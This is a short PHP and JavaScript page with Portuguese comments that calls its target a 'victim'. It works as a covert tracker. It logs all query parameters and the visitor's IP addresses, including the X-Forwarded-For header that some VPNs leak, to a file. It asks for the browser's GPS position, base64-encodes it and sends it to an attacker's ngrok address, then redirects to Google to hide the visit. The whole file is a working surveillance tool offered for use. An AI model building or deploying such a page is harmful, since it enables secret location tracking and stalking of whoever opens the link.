
<?php

    // Créditos ao rafa sousa, o mestre,
    // e criador de todo esse código.
    // Insta: @hackingnaweboficial

    $ip1 = $_SERVER['REMOTE_ADDR'];
    $ip2 = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $f = fopen("log.txt","a");
    foreach ($_GET as $v => $r){
        fwrite($f,$v . " = " . $r . "\r\n");
    }
    fwrite($f, "\$SERVER['REMOTE_ADDR']: " . $ip1 . "\r\n");

    // Em alguns casos, a vítima pode estar usando uma VPN, e,
    // dependendo da VPN, ela não esconde o ip do usuário armazenado no HTTP_X_FORWARDED_FOR
    fwrite($f, "\$_SERVER['HTTP_X_FORWARDED_FOR']: " . $ip2 . "\r\n\r\n");
    fclose($f);
?>

<script>
    // Tentando pegar localização geográfica da vítima
    
    if (navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(position){
            var gps = btoa(position.coords.latitude + "," + position.coords.longitude);
            var xhttp = new XMLHttpRequest();
            
            // Substituindo o NGROK-HTTPS pelo endereço ngrok em https que você subiu
            // Ex: $ ngrok http 443
            xhttp.open("GET","NGROK-HTTPS/?addr="+gps);
            xhttp.send();
        });
    }
</script>

<?php
    // Local de redirecionamento
    header("Location: https://www.google.com.br");
?>
